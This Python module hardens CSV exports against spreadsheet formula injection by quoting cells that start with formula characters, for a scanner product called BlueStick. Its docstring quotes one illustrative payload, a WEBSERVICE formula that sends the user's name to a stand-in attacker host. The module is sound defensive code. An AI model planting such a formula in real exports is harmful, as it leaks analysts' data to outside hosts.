"""Shared CSV-export hardening helpers (v2.86.4).

Excel and LibreOffice treat any cell starting with ``=``, ``+``, ``-``,
``@``, or a leading tab / CR as a formula.  Scanner-derived strings
reach BlueStick CSV exports verbatim — hostname (PTR-spoofable), scan
filename (operator-supplied), agent-recorded command/findings text.
Without neutralization, ``=WEBSERVICE("https://attacker.tld/?u="&USER())``
in a hostname would exfiltrate the moment an analyst opens the
spreadsheet.

This module hoists the previously-private ``_csv_safe`` / ``_safe_csv_row``
helpers out of :mod:`app.api.v1.endpoints.reports` so every CSV writer
in the codebase can share one implementation.  Pre-v2.86.4 the
test-plan-execution branch in :mod:`app.services.export_service` wrote
raw cells through :func:`csv.writer.writerow`, bypassing the guard
entirely — a real injection vector for ``host_hostname``,
``command_run``, and ``findings_summary``.
"""
from __future__ import annotations

from typing import Any, Iterable


_DANGEROUS_CSV_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: Any) -> str:
    """Return ``value`` as a string with formula prefixes neutralized.

    A leading dangerous character is prefixed with a single quote so
    the spreadsheet renders the cell as plain text instead of evaluating
    it as a formula.  ``None`` becomes an empty string.
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(_DANGEROUS_CSV_PREFIXES) else text


def safe_csv_row(writer, values: Iterable[Any]) -> None:
    """Write a row through ``writer`` with every cell run through :func:`csv_safe`."""
    writer.writerow([csv_safe(v) for v in values])
